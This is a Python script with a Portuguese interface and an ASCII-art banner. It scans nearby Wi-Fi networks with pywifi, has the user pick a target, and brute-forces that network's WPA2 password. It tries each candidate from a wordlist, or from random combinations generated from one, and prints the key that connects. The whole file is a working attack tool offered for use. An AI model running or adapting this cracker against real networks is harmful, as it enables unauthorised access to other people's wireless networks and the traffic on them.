print('''
......................~7J~~~7~^:................................................
....................:!PY^..~5~^~~!!~!!~~!!!~~~^^^:..............................
...................:PJ7?:.^::^^:.^5~~!~~!!7!!!~!?Y7~............................
...................7!^~:.^......7!YJJ?JYJ7~^:^:^~7??~............:^~!!77!~~^....
.................:~Y!7!7^.......?P!Y??!?YY!^.......^~.........:!J?!~^^^^^^!?J~..
................:~!7!^~??J!^~!~:.7YP~7...^!:..............:^!??!^:^!!!!7?~..~P!.
............^YY~7?^77~^.:^^::^^^..~J?7................::^!!~~:..~7~:....:7J..^B^
.........^::7~:..:^:.....::~^!~....:~!.............:!?J!^~^:~:!!^.........PJ.:G?
.......7J!^:..........^^:::::...:~::~?^............^#JJ?7!JY7!:...........?G:.YY
.....^JP7^~~!~~.....:^...:.......::~7J^.............Y!...~Y#G^............YY:.Y~
.....:J~::^7!5P^....^::~^............!7.................7PPBY:...........~G~.~?.
.....JJ!.!:?.:!^....^~^:..............?!:............~!!Y^^^...........:!P!.:J:.
....~7!^^::!:..:^^7:...................:^^~^:........^~^.............^7Y?:.^?^..
...:J:.^:~~:!^.::!~...........::::^^^:.:..::^^^^^::^::............^!JJ!:.^!!:...
....:^~JPP5!~~.:.!^..........!^:..::....:..........:::~!~~~~~!777!!~:::^!~:.....
......:??^::^^:~::^..........~..........:^.............:^~~~^^::::::^~^:........
........^!^!!^:.:^J.......................:...............^:.:^~~~^:............
...........^Y!?!?~7!......................^..::::::........!Y7^:................
............^!?JP??J!...................:^..:....^:........:J^~!:...............
.............:^!?!~~~......:^~......:::^::!~~!:^~:........:!7..^!~:.............
...........::::............^~J!~~!^:^~^:..:::!5^........:~~7.....:^^^^^~:.......
..........~:..^~~777!^!~:~~~~:::.............~7^:......^7J?~^:...:...:::!:......
........^7^..~~.:^~~7?7!7~!...................:~~^^:...^J^::~~^~!!~^^^~~:^7:....
......!G?!^:!!:!!!~!^............................:^^~^..!7:...........:^7:^J!...
.:^^~!757PJ~^:~^:...............................:^^^!::!!^.............:P^:Y5...
:YP?~^:^!Y~...................................:^7^:::~~:..............~??~?^:...
.:^~::^:......................................Y7^7J??^:..............:7~~!!.....
............................................:?~^!?^~:...........................

   (
 ( )\     (   (      )      (   (       )
 )((_)   ))\  )\    (      ))\  )(   ( /(
((_)_   /((_)((_)   )\  ' /((_)(()\  )(_))
 / _ \ (_))(  (_) _((_)) (_))   ((_)((_)_
| (_) || || | | || '  \()/ -_) | '_|/ _` |
 \__\_\ \_,_| |_||_|_|_| \___| |_|  \__,_|

Criado por Victor Hugo Rodrigues do Carmo.
''')

import sys
import time
import random
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('CAMI', type=str, action='store', help='caminho do ficheiro')
parser.add_argument('-e', type=int, help='n.º específico de posições')
parser.add_argument('-p', type=int, help='n.º progressivo de posições')
parser.add_argument('-iC', type=str, help='inserir no começo')
parser.add_argument('-iF', type=str, help='inserir no final')
args = parser.parse_args()
CAMI = args.CAMI

lista_posi = []
lista_gera = [1]
lista_tenta = []
lista_aux = [1]

if args.e and args.p:
    raise Exception

def fich():
    lista_elem = []
    for lin in open(CAMI, 'rt'):
        lista_elem.append(lin.strip('\n'))
    return lista_elem

lista_elem = fich()
compr = len(lista_elem)

def aux():
    lista_aux.append(len(lista_elem))
    p = 1
    for n in lista_aux:
        p = p * n
    return p

def proc(c=None):
    sys.stdout.write('\rProcessando... ')
    if c == 1:
        sys.stdout.write('\r')

cc = 0

if args.e:
    var = args.e
    if var < 1:
        raise Exception
    del lista_gera[0]

    for posi in range(args.e):
        lista_gera.append(lista_elem[0])
    
    espe = len(lista_elem) ** args.e

    while True:
        arg1 = random.randint(0, len(lista_gera) - 1)
        arg2 = random.randint(0, len(lista_elem) - 1)
        del lista_gera[arg1]
        lista_gera.insert(arg1, lista_elem[arg2])
        if args.iC:
            lista_gera.insert(0, args.iC)
        if args.iF:
            lista_gera.insert(len(lista_gera), args.iF)
        junto = ''.join(lista_gera)
        if args.iC:
            del lista_gera[0]
        if args.iF:
            del lista_gera[-1]
        if junto in lista_tenta:
            continue
        else:
            lista_tenta.append(junto)
        if len(lista_tenta) == espe:
            proc(1)
            break
        else:
            if cc == 0:
                cc = 1
                proc()
            else:
                continue

elif args.p:
    var = args.p
    if var < 1:
        raise Exception
    for posi in range(args.p):
        if posi == 0:
            lista_posi.append(compr)
        else:
            compr = compr + aux() * len(lista_elem)
            lista_posi.append(compr)

    while True:
        arg1 = random.randint(0, len(lista_gera) - 1)
        arg2 = random.randint(0, len(lista_elem) - 1)
        del lista_gera[arg1]
        lista_gera.insert(arg1, lista_elem[arg2])
        if args.iC:
            lista_gera.insert(0, args.iC)
        if args.iF:
            lista_gera.insert(len(lista_gera), args.iF)
        junto = ''.join(lista_gera)
        if args.iC:
            del lista_gera[0]
        if args.iF:
            del lista_gera[-1]
        if junto in lista_tenta:
            continue
        else:
            lista_tenta.append(junto)
        if len(lista_tenta) == lista_posi[-1]:
            proc(1)
            break
        elif len(lista_tenta) == lista_posi[0]:
            del lista_posi[0]
            lista_gera.append('')
            if cc == 0:
                cc = 1
                proc()
            else:
                continue
else:
    lista_tenta = lista_elem
    var1 = args.e
    var2 = args.p
    if var1 == 0:
        raise Exception
    if var2 == 0:
        raise Exception

tempo_max = len(lista_tenta) * 1.5

if tempo_max >= 3600:
    print('Tempo máximo para conclusão: ', round(tempo_max / 3600, 2), 'h')
elif 3600 > tempo_max >= 60:
    print('Tempo máximo para conclusão: ', int(tempo_max / 60), 'min')
else:
    print('Tempo máximo para conclusão: ', int(tempo_max), 's')

import pywifi
from pywifi import const

def wifi_scan():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    interface.scan()
    for i in range(4):
        print('\rEscaneando Wi-Fi... ', end='')
        time.sleep(1)
    print('\rEscaneamento concluído!\n' + '-' * 80)
    print('\r{:4}{:6}{}'.format('N.º ', 'Intensidade ', 'Nome'))
    bss = interface.scan_results()
    wifi_name_set = set()
    for w in bss:
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 80)
    return wifi_name_list
 
def wifi_password_crack(wifi_name):
    for pwd in lista_tenta:
        wifi = pywifi.PyWiFi()
        interface = wifi.interfaces()[0]
        interface.disconnect()
        while interface.status() == 4:
            pass
        profile = pywifi.Profile()
        profile.ssid = wifi_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        interface.remove_all_network_profiles()
        tmp_profile = interface.add_network_profile(profile)
        interface.connect(tmp_profile)
        start_time = time.time()
        while time.time() - start_time < 1.5:
            if interface.status() == 4:
                print(f'\rConexão bem-sucedida! Senha: {pwd}\n')
                exit(0)
            else:
                continue

def main():
    exit_flag = 0
    target_num = -1
    while not exit_flag:
        try:
            print(''.center(80, '-'))
            wifi_list = wifi_scan()
            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('Selecionar alvo: '))
                    if target_num in range(len(wifi_list)):
                        while not choose_exit_flag:
                            try:
                                choose = str(input(f'Selecionar alvo: {wifi_list[target_num][1]}, certeza? (s/n) '))
                                if choose.lower() == 's':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                else:
                                    print('Somente s/n')
                            except ValueError:
                                print('Somente s/n')
                        if choose_exit_flag == 1:
                            break
                except ValueError:
                    print('Somente número')
            wifi_password_crack(wifi_list[target_num][1])
            print('')
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e

if __name__ == '__main__':
    main()
